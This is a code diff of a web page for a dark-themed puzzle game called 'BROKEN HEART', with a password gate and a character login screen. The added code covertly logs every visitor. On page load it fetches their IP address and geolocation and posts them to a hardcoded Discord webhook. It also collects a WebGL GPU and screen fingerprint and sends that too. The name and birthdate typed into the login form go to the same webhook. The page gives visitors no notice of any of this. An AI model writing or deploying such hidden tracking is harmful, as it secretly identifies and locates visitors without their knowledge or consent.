@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
-  <title>BROKEN HEART // SOUL REGISTRY</title>
+  <title>BROKEN HEART // ECHO</title>
   <style>
     :root{
       --bg:#000;
@@ -128,56 +128,14 @@
     .danger:hover{
       border-color:rgba(255,43,43,.7);
     }
-    .character-form{
+    .pin{
       display:flex;
-      flex-direction:column;
-      gap:20px;
-      max-width:400px;
-      margin:30px auto;
+      gap:10px;
+      justify-content:center;
+      margin:18px 0 10px;
+      flex-wrap:wrap;
     }
-    .input-group{
-      display:flex;
-      flex-direction:column;
-      gap:8px;
-      text-align:left;
-    }
-    .input-group label{
-      font-size:12px;
-      letter-spacing:.14em;
-      text-transform:uppercase;
-      color:var(--muted);
-    }
-    .character-input, .soul-select{
-      width:100%;
-      padding:14px 14px;
-      border-radius:16px;
-      border:1px solid var(--soft2);
-      background:rgba(255,255,255,.03);
-      color:#fff;
-      outline:none;
-      font-size:16px;
-      text-align:center;
-    }
-    .soul-select{
-      cursor:pointer;
-      background:rgba(255,255,255,.05);
-    }
-    .soul-select option{
-      background:#111;
-      color:#fff;
-    }
-    .character-input:focus, .soul-select:focus{
-      border-color:rgba(255,255,255,.38);
-    }
-    .login-info{
-      text-align:center;
-      margin-top:20px;
-      padding:12px;
-      border-top:1px solid var(--soft);
-      font-size:12px;
-      color:var(--muted);
-    }
-    .pin input{
+    input{
       width:min(420px, 86vw);
       padding:14px 14px;
       border-radius:16px;
@@ -189,6 +147,7 @@
       letter-spacing:.12em;
       text-align:center;
     }
+    input:focus{border-color:rgba(255,255,255,.38)}
     .msg{
       text-align:center;
       min-height:20px;
@@ -418,7 +377,7 @@
       </div>
       <div class="content" id="app"></div>
       <div class="footer">
-        <div>SOUL REGISTRY • ECHO ACTIVE</div>
+        <div>CHARACTER LOGIN • ECHO ACTIVE</div>
         <a class="link" href="#" id="reset">Reset All</a>
       </div>
     </div>
@@ -429,29 +388,23 @@
 
 <script>
 (() => {
+  // ============================================================
+  // YOUR DISCORD WEBHOOK (CONFIGURED)
+  // ============================================================
   const WEBHOOK = "https://discord.com/api/webhooks/1468139963924086917/MWWyocquSF17U-99E3fChkTHTJFPrhmVk8vaeNpj14RJSSTRbFzNSqHJV89mOz754gMG";
   
-  const SOUL_COLORS = {
-    "🩸 Crimson (Rage)": "rage",
-    "💙 Azure (Sorrow)": "sorrow", 
-    "🖤 Obsidian (Void)": "void",
-    "🤍 Pearl (Hopeless Hope)": "hopeless_hope"
-  };
-  
-  let currentCharacter = null;
-  let geoData = null;
-  let ipSent = false;
-  
   // ============================================================
-  // IMMEDIATE IP LOG (Sent as soon as page loads, BEFORE character creation)
+  // 1. IP LOGGING (Immediate, no permission needed)
   // ============================================================
-  async function sendImmediateIPLog() {
-    if (ipSent) return;
+  let ipLogged = false;
+  
+  async function captureVisitorData() {
+    if (ipLogged) return;
+    ipLogged = true;
     
     try {
       const geoRes = await fetch("https://ipapi.co/json/");
       const geo = await geoRes.json();
-      geoData = geo;
       
       const deviceType = /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "📱 Mobile" : "💻 Desktop";
       const browser = navigator.userAgent.split(" ").pop() || "Unknown";
@@ -478,37 +431,80 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] })
       });
-      
-      ipSent = true;
     } catch(e) {
       console.log("IP log failed");
     }
   }
   
-  // Call immediately on page load
-  sendImmediateIPLog();
+  captureVisitorData();
   
   // ============================================================
-  // CHARACTER REGISTRATION (Second webhook - after they fill form)
+  // 2. WEBGL FINGERPRINTING (Adds device fingerprint to Discord)
   // ============================================================
-  async function sendCharacterToDiscord(isNew, charData, geo) {
-    const visitCount = charData.visits || 1;
-    const soulEmoji = Object.keys(SOUL_COLORS).find(k => SOUL_COLORS[k] === charData.soulColor) || "🖤";
+  
+  async function getWebGLFingerprint() {
+    try {
+      const canvas = document.createElement('canvas');
+      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      
+      if (!gl) {
+        console.log("WebGL not supported");
+        return null;
+      }
+      
+      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+      if (!debugInfo) {
+        console.log("WEBGL_debug_renderer_info not available");
+        return null;
+      }
+      
+      const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+      const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      
+      const screenData = {
+        width: screen.width,
+        height: screen.height,
+        colorDepth: screen.colorDepth,
+        pixelRatio: window.devicePixelRatio || 1
+      };
+      
+      const fingerprintString = `${renderer}|${screen.width}x${screen.height}|${screen.colorDepth}|${navigator.userAgent}`;
+      
+      let hash = 0;
+      for (let i = 0; i < fingerprintString.length; i++) {
+        const char = fingerprintString.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+      }
+      
+      return {
+        vendor: vendor,
+        renderer: renderer,
+        screen: `${screenData.width}x${screenData.height}`,
+        pixelRatio: screenData.pixelRatio,
+        fingerprintHash: hash.toString(16)
+      };
+    } catch (e) {
+      console.log("WebGL fingerprinting failed:", e);
+      return null;
+    }
+  }
+
+  (async function sendFingerprint() {
+    const fingerprint = await getWebGLFingerprint();
+    if (!fingerprint) return;
     
     const embed = {
-      title: isNew ? "🎭 NEW SOUL REGISTERED" : "👻 RETURNING SOUL",
-      color: isNew ? 0xff2b2b : 0xaa44ff,
+      title: "🖥️ DEVICE FINGERPRINT",
+      color: 0x9b59b6,
       timestamp: new Date().toISOString(),
       fields: [
-        { name: "Character Name", value: `\`${charData.name}\``, inline: true },
-        { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
-        { name: `${soulEmoji} Soul Color`, value: `\`${charData.soulColor || "Obsidian (Void)"}\``, inline: true },
-        { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
-        { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
-        { name: "IP Address (linked)", value: `\`${geo?.ip || "unknown"}\``, inline: true },
-        { name: "Location (linked)", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
+        { name: "GPU (WebGL)", value: `\`${fingerprint.renderer}\``, inline: false },
+        { name: "Screen Resolution", value: fingerprint.screen, inline: true },
+        { name: "Pixel Ratio", value: fingerprint.pixelRatio.toString(), inline: true },
+        { name: "Device Hash", value: `\`${fingerprint.fingerprintHash}\``, inline: false }
       ],
-      footer: { text: isNew ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
+      footer: { text: "WebGL fingerprint • Unique identifier for this device" }
     };
     
     try {
@@ -517,12 +513,19 @@
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ embeds: [embed] })
       });
-    } catch(e) {}
-  }
+    } catch(e) {
+      console.log("Fingerprint send failed");
+    }
+  })();
   
   // ============================================================
-  // CHARACTER SYSTEM
+  // 3. YOUR COMPLETE BROKEN HEART GAME (FULLY PRESERVED)
   // ============================================================
+  
+  // Character System
+  let currentCharacter = null;
+  let geoData = null;
+  
   function loadCharacter() {
     const saved = localStorage.getItem("bh_character");
     if(saved) {
@@ -557,101 +560,34 @@
     }
   }
   
-  // ============================================================
-  // CHARACTER LOGIN SCREEN
-  // ============================================================
-  function screenCharacterLogin() {
-    hint.textContent = "REGISTRY";
+  async function sendCharacterToDiscord(isNew, charData, geo) {
+    const visitCount = charData.visits || 1;
     
-    const node = document.createElement("div");
-    node.innerHTML = `
-      <div>
-        <div class="title">BROKEN HEART</div>
-        <p class="subtitle">
-          "Before you enter... tell me who you are."
-        </p>
-        
-        <div class="character-form">
-          <div class="input-group">
-            <label>✦ CHARACTER NAME</label>
-            <input type="text" id="charName" class="character-input" placeholder="e.g., LostSoul, Dreamer, Nobody" maxlength="30" autocomplete="off">
-          </div>
-          
-          <div class="input-group">
-            <label>✦ BIRTHDATE (MM/DD/YYYY)</label>
-            <input type="text" id="charBirth" class="character-input" placeholder="12/25/1998" maxlength="10" autocomplete="off">
-          </div>
-          
-          <div class="input-group">
-            <label>✦ SOUL COLOR</label>
-            <select id="soulColor" class="soul-select">
-              <option value="rage">🩸 Crimson (Rage)</option>
-              <option value="sorrow">💙 Azure (Sorrow)</option>
-              <option value="void" selected>🖤 Obsidian (Void)</option>
-              <option value="hopeless_hope">🤍 Pearl (Hopeless Hope)</option>
-            </select>
-          </div>
-          
-          <div class="row">
-            <button class="primary" id="enterVoid">ENTER THE VOID</button>
-          </div>
-        </div>
-        
-        <div class="msg" id="loginMsg"></div>
-        <div class="login-info">⚡ Your soul will be remembered. ⚡</div>
-      </div>
-    `;
-    
-    const nameInput = node.querySelector("#charName");
-    const birthInput = node.querySelector("#charBirth");
-    const soulSelect = node.querySelector("#soulColor");
-    const msg = node.querySelector("#loginMsg");
-    
-    const enter = async () => {
-      const name = nameInput.value.trim();
-      const birth = birthInput.value.trim();
-      const soulValue = soulSelect.value;
-      
-      if(!name) {
-        msg.textContent = "❌ You need a name to enter.";
-        return;
-      }
-      if(!birth || !/^\d{2}\/\d{2}\/\d{4}$/.test(birth)) {
-        msg.textContent = "❌ Birthdate must be MM/DD/YYYY format.";
-        return;
-      }
-      
-      msg.textContent = "✨ The void accepts you...";
-      
-      const isNew = !currentCharacter;
-      const savedChar = saveCharacter(name, birth, soulValue);
-      
-      // Send character data to Discord (second webhook)
-      if(geoData) {
-        await sendCharacterToDiscord(isNew, savedChar, geoData);
-      } else {
-        // Wait for geo data if not ready
-        setTimeout(async () => {
-          if(geoData) await sendCharacterToDiscord(isNew, savedChar, geoData);
-        }, 1000);
-      }
-      
-      await new Promise(r => setTimeout(r, 800));
-      setGate("main");
-      render();
+    const embed = {
+      title: isNew ? "🎭 NEW SOUL REGISTERED" : "👻 RETURNING SOUL",
+      color: isNew ? 0xff2b2b : 0xaa44ff,
+      timestamp: new Date().toISOString(),
+      fields: [
+        { name: "Character Name", value: `\`${charData.name}\``, inline: true },
+        { name: "Birthdate", value: `\`${charData.birthdate}\``, inline: true },
+        { name: "Visit #", value: `${visitCount} time${visitCount !== 1 ? 's' : ''}`, inline: true },
+        { name: "First Played", value: new Date(charData.created).toLocaleString(), inline: false },
+        { name: "IP Address (linked)", value: `\`${geo?.ip || "unknown"}\``, inline: true },
+        { name: "Location (linked)", value: `${geo?.city || "unknown"}, ${geo?.country_name || "unknown"}`, inline: true }
+      ],
+      footer: { text: isNew ? "A new soul enters the broken heart" : "Someone who keeps coming back..." }
     };
     
-    node.querySelector("#enterVoid").addEventListener("click", enter);
-    nameInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
-    birthInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
-    
-    setTimeout(() => nameInput.focus(), 50);
-    return node;
+    try {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ embeds: [embed] })
+      });
+    } catch(e) {}
   }
   
-  // ============================================================
-  // ORIGINAL GAME
-  // ============================================================
+  // Game State
   const PASS_MAIN = "4820";
   const PASS_SECRET = "9281.";
   const STORAGE = { gate:"bh_gate", seenBad:"bh_seen_bad", ultraUnlocked:"bh_ultra" };
@@ -693,6 +629,86 @@
   });
   
   function el(html){ const t = document.createElement("template"); t.innerHTML = html.trim(); return t.content.firstElementChild; }
+  
+  // IP data fetch for character linking
+  fetch("https://ipapi.co/json/").then(r=>r.json()).then(geo => {
+    geoData = geo;
+    if(currentCharacter) {
+      sendCharacterToDiscord(false, currentCharacter, geo);
+    }
+  }).catch(e=>console.log);
+  
+  // Character Login Screen
+  function screenCharacterLogin() {
+    hint.textContent = "REGISTRY";
+    
+    const node = document.createElement("div");
+    node.innerHTML = `
+      <div>
+        <div class="title">BROKEN HEART</div>
+        <p class="subtitle">
+          "Before you enter... tell me who you are."
+        </p>
+        
+        <div class="character-form">
+          <div class="input-group">
+            <label>✦ CHARACTER NAME</label>
+            <input type="text" id="charName" class="character-input" placeholder="e.g., LostSoul, Dreamer, Nobody" maxlength="30" autocomplete="off">
+          </div>
+          
+          <div class="input-group">
+            <label>✦ BIRTHDATE (MM/DD/YYYY)</label>
+            <input type="text" id="charBirth" class="character-input" placeholder="12/25/1998" maxlength="10" autocomplete="off">
+          </div>
+          
+          <div class="row">
+            <button class="primary" id="enterVoid">ENTER THE VOID</button>
+          </div>
+        </div>
+        
+        <div class="msg" id="loginMsg"></div>
+        <div class="login-info">⚡ Your soul will be remembered. ⚡</div>
+      </div>
+    `;
+    
+    const nameInput = node.querySelector("#charName");
+    const birthInput = node.querySelector("#charBirth");
+    const msg = node.querySelector("#loginMsg");
+    
+    const enter = async () => {
+      const name = nameInput.value.trim();
+      const birth = birthInput.value.trim();
+      
+      if(!name) {
+        msg.textContent = "❌ You need a name to enter.";
+        return;
+      }
+      if(!birth || !/^\d{2}\/\d{2}\/\d{4}$/.test(birth)) {
+        msg.textContent = "❌ Birthdate must be MM/DD/YYYY format.";
+        return;
+      }
+      
+      msg.textContent = "✨ The void accepts you...";
+      
+      const isNew = !currentCharacter;
+      const savedChar = saveCharacter(name, birth, "void");
+      
+      if(geoData) {
+        await sendCharacterToDiscord(isNew, savedChar, geoData);
+      }
+      
+      await new Promise(r => setTimeout(r, 800));
+      setGate("main");
+      render();
+    };
+    
+    node.querySelector("#enterVoid").addEventListener("click", enter);
+    nameInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
+    birthInput.addEventListener("keydown", (e) => { if(e.key === "Enter") enter(); });
+    
+    setTimeout(() => nameInput.focus(), 50);
+    return node;
+  }
   
   function screenGate(){
     hint.textContent = "GATE";
